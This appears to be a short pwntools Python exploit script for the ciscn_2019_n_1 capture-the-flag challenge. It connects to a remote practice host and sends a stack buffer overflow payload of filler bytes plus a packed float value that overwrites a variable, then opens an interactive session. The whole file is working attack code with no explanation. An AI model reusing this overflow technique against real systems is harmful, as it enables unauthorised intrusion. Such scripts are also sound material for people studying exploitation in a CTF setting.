from pwn import *

import ctypes
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

# p=process("./ciscn_2019_n_1")

# p=remote("121.37.132.113",10001)
p=remote("node4.buuoj.cn",29848)

payload=0x2c*b'A'+p64(0x41348000)#+p64(0x8048320)

print(payload)


# # payload=b'233'
# p.sendafter(b'What\'s your name? \n',payload)

p.sendline(payload)
p.interactive()